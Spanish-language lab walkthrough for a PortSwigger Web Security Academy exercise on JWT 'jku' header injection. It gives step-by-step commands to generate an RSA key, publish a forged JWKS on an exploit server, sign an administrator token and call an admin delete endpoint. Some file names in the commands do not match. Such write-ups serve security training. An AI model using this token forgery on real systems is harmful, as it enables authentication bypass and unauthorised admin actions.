#reconocimiento
```bash
$ curl -v https://0afb006e0399c0e880b644f900c200f0.web-security-academy.net/login

```

```bash
$ curl -d "csrf=0zw6uN0mSWggMlEfYNygyUfM6TD7dUtd" -d "username=wiener" -d "password=peter" https://0afb006e0399c0e880b644f900c200f0.web-security-academy.net/login -c cookies.txt -v -L

#salida

Cookie: session=eyJraWQiOiIyZTEzZWRiNC0yMWY0LTQ4OWEtODBlZi0xNGE0ZGIwMDk5ODMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2ODMxNTgwMCwic3ViIjoid2llbmVyIn0.DRW8UOj-ABSTcqtUqFpkgfJjZR5gatT05192yKgijp7y1UtMqI4bnRuKkipBGuzEq-8N04vh0YyRxkNKONS0wxjaxDQgTZGhO6cIEwWsRd9TiHqZGw4D6lrzaoCfD0O65F_q4SzGBC4UTIhLzlXZwvUl4YHURGpVqutioMv16ia68lvlf0DdzEwzWt12jqr_qknbjNgjd0tWwTUudUYT3-qtOoglWdgobE87NZlCf_NkNntwpJK81C3iRQXk-rZQ2sR2wSB-r_llGFO1iLbTt6FVgPwMTelqngA0RvtzwBQuF1vJ_qCYK5Yb_Ll_05nlSRxfBe0OcYGUO66iDo9fvA

#explotacion
##1.pasamos a la genercacion de las claves

```bash
openssl genrsa -out private.pem 2048

```

### 2. Extraer el valor 'n' (Modulus)

El valor `n` es la parte más larga de tu llave pública. Necesitamos sacarlo en formato hexadecimal y luego convertirlo a Base64URL.

```bash
# Extraer el módulo en hexadecimal
openssl rsa -in private.pem -modulus -noout | cut -d= -f2 > n.hex

# Convertirlo a Base64URL con este comando de Python (una sola línea)
python3 -c "import base64; h=open('n.hex').read().strip(); print(base64.urlsafe_b64encode(bytes.fromhex(h)).decode().replace('=', ''))" > n.sb64

```
##4.de hay pasamos a lacreacion del json keys

```bash
N=$(cat n.bs64 | tr -d '\n\r ')
# Generamos el JSON de la llave
cat <<EOF > keys.json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "mi-identificador-unico",
            "n": "$N"
        }
    ]
}
EOF
# Muestra el contenido para copiarlo
cat keys.json

```
de forma adicional el parametro key deberiamos de tratar de mantenerlo igual al original

de hay pasamos ese keys.json contenido al exploit server, en el body del link del server que nos
da postwigger
, con el link hara pasamos a forjar el nuevo token

# Tu URL del Exploit Server
URL_EXPLOIT="https://exploit-0a0000bb04c0e0838210385d01920016.exploit-server.net/exploit"

# El KID que pusiste en el Body del exploit server (asegúrate que sea el mismo)
MY_KID="mi-identificador-unico"

ese MY_KID debe de ser igual al del exploit anterior

# Header con JKU
echo -n "{\"alg\":\"RS256\",\"jku\":\"$URL_EXPLOIT\",\"kid\":\"$MY_KID\"}" > header.json

# Payload para administrator (tomando el 'iss' y 'exp' del original)
echo -n '{"iss":"portswigger","exp":1768315800,"sub":"administrator"}' > payload.json

encode_b64url() { base64 | tr -d '=' | tr '+/' '-_' | tr -d '\n'; }

H_B64=$(cat header.json | encode_b64url)
P_B64=$(cat payload.json | encode_b64url)
DATA="$H_B64.$P_B64"

# Firmamos con tu llave privada (la que generaste antes)
SIG_B64=$(echo -n "$DATA" | openssl dgst -sha256 -sign private.pem | encode_b64url)

TOKEN="$DATA.$SIG_B64"

echo -e "\n[+] TU TOKEN FORJADO:\n$TOKEN"

despues de esto procedemos a realizar el ataque cambiando la url del lab obviamente

# Reemplaza [ID-LAB] con el ID de tu URL del laboratorio (no del exploit)
curl -v --http1.1 -H "Cookie: session=$TOKEN" "https://0a0000bb04c0e0838210385d01920016.web-security-academy.net/admin/delete?username=carlos"

